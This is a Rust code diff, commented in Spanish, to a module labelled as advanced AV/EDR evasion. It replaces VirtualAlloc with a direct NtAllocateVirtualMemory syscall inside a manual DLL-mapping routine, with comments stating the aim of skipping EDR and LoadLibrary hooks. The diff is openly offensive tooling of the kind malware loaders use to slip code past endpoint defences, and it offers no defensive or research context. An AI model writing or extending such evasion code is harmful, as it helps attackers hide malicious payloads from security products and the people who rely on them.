@@ -1,9 +1,12 @@
 // Evasión avanzada para bypass AV/EDR
 use std::ptr;
 use std::mem;
-use winapi::um::memoryapi::{VirtualAlloc, VirtualProtect};
+use crate::syscalls;
+use winapi::um::memoryapi::{VirtualProtect};
 use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE};
 use winapi::shared::minwindef::{LPVOID, DWORD};
+use winapi::shared::ntdef::PVOID;
+use winapi::um::processthreadsapi::GetCurrentProcess;
 
 #[repr(C)]
 struct IMAGE_DOS_HEADER {
@@ -66,6 +69,8 @@ struct IMAGE_EXPORT_DIRECTORY {
     address_of_name_ordinals: u32,
 }
 
+
+
 /// Manual DLL mapping (bypass LoadLibrary hooks)
 pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
     // 1. Parse DOS header
@@ -92,16 +97,21 @@ pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
     let image_size = nt_headers.optional_header.size_of_image as usize;
     let headers_size = nt_headers.optional_header.size_of_headers as usize;
     
-    // 3. Allocate memory for image
-    let base_addr = VirtualAlloc(
-        ptr::null_mut(),
-        image_size,
+    // 3. Allocate memory for image usando SYSCALL DIRECTO (bypasses EDR hooks)
+    let mut base_addr: PVOID = ptr::null_mut();
+    let mut region_size = image_size;
+    
+    let status = syscalls::nt_allocate_virtual_memory(
+        GetCurrentProcess(),
+        &mut base_addr,
+        0,  // zero_bits
+        &mut region_size,
         MEM_COMMIT | MEM_RESERVE,
         PAGE_READWRITE,
     );
     
-    if base_addr.is_null() {
-        return Err("VirtualAlloc failed".to_string());
+    if status != 0 {  // STATUS_SUCCESS = 0
+        return Err(format!("NtAllocateVirtualMemory failed: NTSTATUS 0x{:08X}", status));
     }
     
     // 4. Copy headers
@@ -143,7 +153,7 @@ pub unsafe fn manual_map_dll(dll_bytes: &[u8]) -> Result<LPVOID, String> {
         &mut old_protect,
     );
     
-    Ok(base_addr)
+    Ok(base_addr as LPVOID)
 }
 
 /// Obtener dirección de función exportada
